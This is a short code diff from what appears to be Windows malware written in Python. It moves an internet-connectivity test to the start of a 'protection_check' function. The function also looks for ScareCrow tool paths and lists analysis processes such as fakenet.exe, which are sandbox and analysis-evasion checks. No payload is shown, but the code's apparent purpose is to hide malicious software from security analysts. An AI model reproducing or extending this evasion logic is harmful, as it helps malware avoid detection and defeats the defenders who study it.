@@ -10,6 +10,11 @@ import pyautogui
 import ctypes
 
 def protection_check():
+    try:
+        requests.get("https://google.com") # the method may change in the future
+    except requests.ConnectionError:
+        return True
+
     def check_scarecrow():
         scarecrow_paths = [
             "C:\\ProgramData\\ScareCrow",
@@ -168,11 +173,6 @@ def protection_check():
             return True
 
         return False
-
-    try:
-        requests.get("https://google.com") # the method may change in the future
-    except requests.ConnectionError:
-        return True
     
     blacklisted_processes = [
         'fakenet.exe', 
